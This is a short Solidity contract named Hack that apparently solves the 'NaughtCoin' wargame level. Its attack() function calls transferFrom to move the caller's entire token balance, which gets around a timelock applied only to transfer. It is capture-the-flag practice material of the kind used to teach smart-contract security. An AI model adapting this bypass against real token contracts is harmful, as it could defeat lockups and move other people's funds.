// SPDX-License-Identifier: WTFPL
pragma solidity 0.8.7;

interface INaughtCoin {
    function balanceOf(address account) external returns (uint256);

    function transferFrom(
        address _from,
        address _to,
        uint256 _value
    ) external returns (bool success);
}

contract Hack {
    INaughtCoin naught;

    constructor(address contractAddress) {
        naught = INaughtCoin(contractAddress);
    }

    function attack() public {
        uint256 balance = naught.balanceOf(msg.sender);
        naught.transferFrom(msg.sender, address(this), balance);
    }
}